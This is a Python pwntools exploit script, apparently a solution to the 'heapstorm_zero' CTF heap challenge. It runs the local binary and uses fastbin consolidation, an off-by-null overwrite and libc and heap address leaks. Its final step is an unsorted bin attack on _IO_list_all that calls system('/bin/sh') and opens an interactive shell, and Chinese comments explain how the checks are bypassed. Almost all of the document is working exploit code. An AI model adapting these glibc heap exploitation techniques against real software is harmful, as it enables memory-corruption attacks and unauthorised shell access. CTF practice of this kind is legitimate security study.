#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=process("./heapstorm_zero")
context.terminal=["tmux","splitw","-h"]
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x0000000000010F6)
    b *(0x555555554000+0x000000000001296)    
    ''')
#add,delete
def menu(index):
    a.recvuntil("Choice:")
    a.sendline(str(index))
def add(size,content):
    menu(1)
    a.recvuntil("size:")
    a.sendline(str(size))
    a.recvuntil("Please input chunk content:")
    a.send(content)
def delete(index):
    menu(3)
    a.recvuntil("Please input chunk index: ")
    a.sendline(str(index))
def show(index):
    menu(2)
    a.recvuntil("Please input chunk index:")
    a.sendline(str(index))
def malloc_consolidate():
    a.recvuntil("Choice:")
    a.sendline("1"*0x500)

add(0x38,'0\n')#0 0

add(0x38,'1\n')#1 0x40
add(0x38,'2\n')#2 0x80
add(0x38,'3\n')#3 0xc0
add(0x38,'4\n')#4 0x100
add(0x38,'5\n')#5 0x140

add(0x38,'6\n')#6 0x180

add(0x38,'7\n')#7 0x1c0
add(0x38,'8\n')#8 0x200
add(0x38,'9\n')#9 0x240
add(0x38,'10\n')#10 0x280

for i in range(1,6):
    delete(i)

malloc_consolidate()
#处理完unsred bin ，会去bin中遍历，其中会进行unlink操作
#将他从 small bin 中取出，放进unsorted bin，
#变成last rediner,绕过在small bin中的unlink中对size的检查(这里没设置fake_size)

add(0x28,'\x00'*0x28)#1, 0x40, offbyNULL, unsorted chunksize 0x140 ==> 0x100 
add(0x38,'\n')#2 0x70
add(0x38,'\n')#3 0xb0
add(0x38,'\n')#4 0xf0
add(0x18,'\n')#5 0x130
add(0x18,'\n')#11
delete(6)# put in fastbin
delete(2)# bypass unlink prev_size's check ,要让chunk2先合并，否者prev_size不会设置
         # free fastbin chunk 不会设置prev_size
debug()
malloc_consolidate()# merge 
add(0x38,'\n')#2
show(3)
a.recvuntil(": ")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)
add(0x28,'\n')#6 = 3
add(0x28,p64(0x41)*3+'\n')#12  ,unsorted bin ==> 0x110
delete(12) 
delete(6) #fd ==> chunk4(chunk11)
show(3)
a.recvuntil(": ")
heap_base=u64(a.recv(6).ljust(8,'\x00'))-0xd0-0x10
success("heap_base ==> 0x%x"%heap_base)
delete(4)
io_list_all=libc_base+libc.symbols["_IO_list_all"]
payload=p64(0)*2
payload+='/bin/sh\x00'+p64(0x61)   # unsorted bin prev_size ,size 
payload+=p64(0)+p64(io_list_all-0x10)+'\n'
add(0x38,payload)
delete(7)
system_addr=libc.symbols["system"]+libc_base
payload='\x00'*0x18+p64(heap_base+0x1e8)+p64(system_addr)*3+'\n'
add(0x38,payload)
menu(1)
a.recv()
a.sendline("1")
a.interactive()